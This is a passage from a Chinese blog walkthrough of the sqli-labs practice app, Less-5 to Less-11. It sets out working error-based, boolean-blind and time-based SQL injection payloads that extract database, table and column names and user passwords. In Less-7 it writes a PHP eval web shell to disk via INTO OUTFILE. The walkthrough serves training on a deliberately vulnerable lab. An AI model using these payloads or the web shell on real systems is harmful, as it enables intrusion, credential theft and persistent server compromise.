src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174447919.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174515636.png" class><p><code>接着测试发现存在时间延时</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and sleep(5) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231175223651.png" class><h3 id="1-第一种方法-利用报错注入"><a href="#1-第一种方法-利用报错注入" class="headerlink" title="1.第一种方法(利用报错注入)"></a>1.第一种方法(利用报错注入)</h3><p><strong>先来理解几个函数</strong></p><p><code>concat聚合函数</code></p><blockquote><p>简单的说，使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。</p><p>比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p><p>如下例：数据库版本为5.5.530</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat((select version()), floor(rand()*2))as x from information_schema.tables group by x;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231192403062.png" class><p><code>rand()函数</code></p><blockquote><p>rand() 是一个随机函数，通过一个固定的随机数的种子0之后，可以形成固定的伪随机序列，每次生成的随机数都是一样的。如下图</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231190859205.png" class><p><code>floor()函数</code></p><blockquote><p>floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。floor(rand(0)*2)输出如下。</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231191348407.png" class><p><code>group by</code></p><blockquote><p>group by 主要用来对数据进行分组（相同的分为一组，相同名字会合并）</p></blockquote><p><code>count(*)</code></p><blockquote><p>count(*)用于统计数据出现的次数</p></blockquote><p><strong>探测列数，结果为3列</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231200902624.png" class><p><strong>爆库</strong></p><blockquote><p>报错时才会回显</p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIzNTQ5Ni5odG1s">键值报错原理参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201157161.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201226057.png" class><p><strong>爆表</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">将table_schema=database()换为table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231204516748.png" class><p><strong>爆users表列名</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205019454.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205043144.png" class><p><strong>爆字段</strong></p><blockquote><p>concat_ws用于指定符号拼接，本次使用-拼接</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 0,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 1,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 3,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line">。。。</span><br><span class="line">。。。</span><br><span class="line">。。。</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231210556609.png" class><p><code>另一种报错方式</code></p><blockquote><p>使用updatexml函数，updatexml(XML_document, XPath_string, new_value);</p></blockquote><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>XML_document</td><td>String格式，为XML文档对象的名称，文中为Doc</td></tr><tr><td>XPath_string</td><td>Xpath格式的字符串</td></tr><tr><td>new_value</td><td>String格式，替换查找到的符合条件的数据</td></tr></tbody></table><p><strong>payload如下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select ***()),0x7e),1</span><br></pre></td></tr></table></figure><p><strong>原理</strong></p><blockquote><p><code>concat()</code>函数是将其连成一个字符串，因此不会符合<strong>XPATH_string</strong>的格式，从而出现格式错误</p></blockquote><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102233937461.png" class><p><code>简单的方法</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234125500.png" class><p><code>用户版本等</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234201499.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234230939.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234706750.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234733739.png" class><p><code>爆字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 2,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235422105.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235434612.png" class><p><code>爆数据</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235643837.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235701283.png" class><h3 id="2-第二种方法-利用bool注入"><a href="#2-第二种方法-利用bool注入" class="headerlink" title="2.第二种方法(利用bool注入)"></a>2.第二种方法(利用bool注入)</h3><p><code>在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101182907330.png" class><blockquote><p>此种注入可以使用bp的intruder模块进行爆破，如下图。由于mysql不区分大小写，所以字典为a-z、0-9，特殊的加上特殊字符即可。</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190352877.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190421957.png" class><p><code>依次类推，进行爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183102013.png" class><p><code>接下来进行爆第一张表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&#x27;em&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),6)=&#x27;emails&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183326285.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183525900.png" class><p><code>爆出第四张表为users，接下来进行爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>第一个列名为id</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222734437.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>第二个与第三个列名为username、password</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222533544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222604381.png" class><p><code>爆数据即username与password字段的内容</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select username from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185002099.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select password from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185116009.png" class><p><strong>也可以使用substr截断函数进行爆库、爆表、爆字段</strong></p><blockquote><p>substr函数与limit不同，截取第一个字符为从1开始，而limit从0开始</p></blockquote><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),3,1)=&#x27;c&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),4,1)=&#x27;u&#x27; -- -</span><br><span class="line">// 同样可以使用intruder进行爆破</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102204726445.png" class><p><code>也可以使用ASCII进行查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and ord(substr(database(),1,1))=115 -- -</span><br><span class="line">// ord为ASCII转换函数，s的ASCII值为115。</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205332810.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205349191.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#x27;u&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,2)=&#x27;us&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,3)=&#x27;use&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,4)=&#x27;user&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,5)=&#x27;users&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205811674.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102210130815.png" class><p><code>爆字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1,2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222854581.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),1,8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),1,8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223125374.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223201941.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223440143.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223459949.png" class><p><strong><em>skip：这种方法就是比较麻烦，累傻小子的活建议sqlmap💂‍♀️</em></strong></p><h3 id="3-第三种方法-利用时间延时注入"><a href="#3-第三种方法-利用时间延时注入" class="headerlink" title="3.第三种方法(利用时间延时注入)"></a>3.第三种方法(利用时间延时注入)</h3><p><code>爆库名长度，这里依旧可以使用intruder</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(length(database())=8,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190911402.png" class><p><code>爆库</code></p><p><code>也可以将length()换为substr()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/id=1&#x27; and if(left(database(),8)=&#x27;security&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191846689.png" class><p><code>爆表，第四张表为users</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191536441.png" class><p><code>爆users表的字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),8)=&#x27;id&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192412154.png" class><p><code>第二个字段与第三个字段为username、password</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),8)=&#x27;username&#x27;,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),8)=&#x27;password&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192640873.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192551041.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select username from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select password from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193118321.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193031194.png" class><p><strong><em>skip：同样使用intruder进行爆破是一个不错的手段</em></strong></p><h2 id="0x06-Less-6-GET-双注入-双引号"><a href="#0x06-Less-6-GET-双注入-双引号" class="headerlink" title="0x06.Less-6 GET 双注入 双引号"></a>0x06.Less-6 GET 双注入 双引号</h2><p><code>同Less5，将单引号换为双引号即可</code></p><h2 id="0x07-Less-7-GET-Dump函数-导出文件"><a href="#0x07-Less-7-GET-Dump函数-导出文件" class="headerlink" title="0x07.Less-7 GET Dump函数 导出文件"></a>0x07.Less-7 GET Dump函数 导出文件</h2><p><code>首先需要知道web后台的路径格式，这里使用Less-1，菜狗的我没有想到其他好办法.....</code></p><blockquote><p>IIS默认路径是    C:\Inetpub\wwwroot</p><p>nginx一般是    /usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等</p><p>apache是    /var/www/html，/var/www/html/htdocs</p><p>phpstudy 就是    \PhpStudy\WWW\</p><p>xammp 就是    \xampp\htdocs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,@@basedir,@@datadir -- -</span><br></pre></td></tr></table></figure><blockquote><p>其中basedir为MySQL 的安装路径，datadir为MySQL 的数据库文件路径</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101215105882.png" class><p><code>可以猜到web路径为C:\phpstudy\www，之后就可以上传文件</code></p><p><code>这里已经探测到闭合字符为&#39;))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-7/?id=0&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;demo&quot;]);?&gt;&#x27; into outfile &quot;C:\\phpStudy\\www\\sqli\\less-7\\demo.php&quot; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220528860.png" class><p><code>访问demo.php查看文件是否上传成功</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220623654.png" class><p><code>上传成功，蚁剑连接</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220848719.png" class><h2 id="0x08-Less-8-GET-基于bool-盲注-单引号"><a href="#0x08-Less-8-GET-基于bool-盲注-单引号" class="headerlink" title="0x08.Less-8 GET 基于bool 盲注 单引号"></a>0x08.Less-8 GET 基于bool 盲注 单引号</h2><blockquote><p>同Less5 方法二</p></blockquote><h2 id="0x09-Less-9-GET-基于时间-盲注-单引号"><a href="#0x09-Less-9-GET-基于时间-盲注-单引号" class="headerlink" title="0x09.Less-9 GET 基于时间 盲注 单引号"></a>0x09.Less-9 GET 基于时间 盲注 单引号</h2><p><code>无论输入什么都只有You are in...</code></p><blockquote><p>同Less5 方法三</p></blockquote><h2 id="0x010-Less-10-GET-基于时间-盲注-双引号"><a href="#0x010-Less-10-GET-基于时间-盲注-双引号" class="headerlink" title="0x010.Less-10 GET 基于时间 盲注 双引号"></a>0x010.Less-10 GET 基于时间 盲注 双引号</h2><blockquote><p>同Less9，将单引号换为双引号</p></blockquote><h2 id="0x011-Less-11-POST-基于报错-单引号"><a href="#0x011-Less-11-POST-基于报错-单引号" class="headerlink" title="0x011.Less-11 POST 基于报错 单引号"></a>0x011.Less-11 POST 基于报错 单引号</h2><p><code>uname存在注入</code></p><img 